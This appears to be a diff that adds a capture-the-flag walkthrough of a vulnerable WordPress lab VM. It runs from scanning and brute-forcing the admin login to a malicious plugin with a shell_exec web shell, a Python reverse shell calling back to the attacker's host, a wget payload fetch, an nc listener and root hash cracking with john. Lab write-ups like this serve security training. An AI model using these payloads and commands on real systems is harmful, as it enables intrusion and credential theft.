@@ -1,0 +1,104 @@
+[*]1. Find host: nmap -sn 172.16.16.0/24
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-22 22:03 CST
+Nmap scan report for 172.16.16.1
+Host is up (0.0010s latency).
+Nmap scan report for glorenet.us (172.16.16.10)
+Host is up (0.000051s latency).
+Nmap scan report for 172.16.16.49
+Host is up (0.00047s latency).
+
+[*]2. Quick scan: nmap 172.16.16.49
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-22 22:03 CST
+Nmap scan report for 172.16.16.49
+Host is up (0.0013s latency).
+Not shown: 999 closed ports
+PORT   STATE SERVICE
+80/tcp open  http
+
+[*]3. Background extended scan: nmap 172.16.16.49 -oX scan.xml -p- 
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-22 22:03 CST
+Nmap scan report for 172.16.16.49
+Host is up (0.0056s latency).
+Not shown: 65534 closed ports
+PORT   STATE SERVICE
+80/tcp open  http
+
+[*]4. HTTP enumeration: curl -vv 172.16.16.49/
+reveals wordpress ran website, with hostname odin. Also the first comment by odin has base64, with 404.ph
+
+[*]5. Add 'odin' to hosts file: sudo nano /etc/hosts
+
+[*]6. Decode base64/32: 
+echo 'SWYgeW91IGxvb2sgY2xvc2VseSwgeW91IHdvbid0IG5lZWQgaXQgaGVyZQo=' | base64 -d
+If you look closely, you won't need it here.
+
+echo 'NB2HI4DTHIXS6Z3JORUHKYROMNXW2L3EMFXGSZLMNVUWK43TNRSXEL2TMVRUY2LTORZS6YTMN5RC
+63LBON2GK4RPKBQXG43XN5ZGI4ZPJRSWC23FMQWUIYLUMFRGC43FOMXXE33DNN4W65JOOR4HILTU
+MFZC4Z32EBZG6Y3LPFXXKIDONFRWKIDXN5ZGI3DJON2AU==='| base32 -d
+https://github.com/danielmiessler/SecLists/blob/master/Passwords/Leaked-Databases/rockyou.txt.tar.gz rockyou nice wordlist
+
+7. Bruteforce with hint given: (wpscan detects user odin from rss)
+[*]
+wpscan --url odin/ -U admin,odin -P /usr/share/wordlists/rockyou.txt
+
+Cying odin / 222222 Time: 00:00:02 <                                                                                    > (189 / 28688804)  0.00%  ETA: ??:??:??
+[!] Valid Combinations Found:
+ | Username: admin, Password: qwerty
+
+[*]8. Use wordpwn to generate a malicoius wordpress plugin to kick a reverse shell
+https://github.com/wetw0rk/malicious-wordpress-plugin
+./wordpwn.py 172.16.16.10 4444
+
+[*]9. The shell kept closing so I added some cmd execution to the plugin
+echo shell_exec($_GET['cmd']);
+
+[*]10. make revershell: rev.py
+#!/usr/bin/env python3
+import socket,subprocess,os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(('172.16.16.10',443))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+import pty
+pty.spawn("/bin/bash")
+
+[*]11. Transfer file:
+python -m SimpleHTTPServer -m 8000
+http://172.16.16.49/wp-content/plugins/malicious/QwertyRocks.php?cmd=wget%20http://172.16.16.10:8000/rev.py
+
+[*]12. Start listener, and launch shell:
+nc -nvlp 443
+http://172.16.16.49/wp-content/plugins/malicious/QwertyRocks.php?cmd=python3 rev.py
+
+[*]13. First checked wp-config file
+/** Sets up WordPress vars and included files. */
+require_once ABSPATH . 'wp-settings.php';
+
+/** root:$6$e9hWlnuTuxApq8h6$ClVqvF9MJa424dmU96Hcm6cvevBGP1OaHbWg//71DVUF1kt7ROW160rv9oaL7uKbDr2qIGsSxMmocdudQzjb01:18600:0:99999:7:::*/
+
+[*]14. This appears to be a root hash. I used john to crack it
+echo 'root:$6$e9hWlnuTuxApq8h6$ClVqvF9MJa424dmU96Hcm6cvevBGP1OaHbWg//71DVUF1kt7ROW160rv9oaL7uKbDr2qIGsSxMmocdudQzjb01' > hash
+john hash
+Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist                                                                                                                     
+jasmine          (root)                                                                                                                                                                   
+1g 0:00:00:00 DONE 2/3 (2020-12-23 17:12) 3.448g/s 8206p/s 8206c/s 8206C/s 123456..keeper                                                                                                 
+Use the "--show" option to display all of the cracked passwords reliably                                                                                                                  
+Session completed    
+
+[*]15. Get flag:
+root@osboxes:~# cat bjorn
+cat bjorn
+cσηgяαтυℓαтιση
+
+Have a nice day!
+
+
+aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1WaGtmblBWUXlhWQo=
+root@osboxes:~# echo 'aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1WaGtmblBWUXlhWQo=' | base64 -d
+<ViZS5jb20vd2F0Y2g/dj1WaGtmblBWUXlhWQo=' | base64 -d
+https://www.youtube.com/watch?v=VhkfnPVQyaY
+
+
+
+
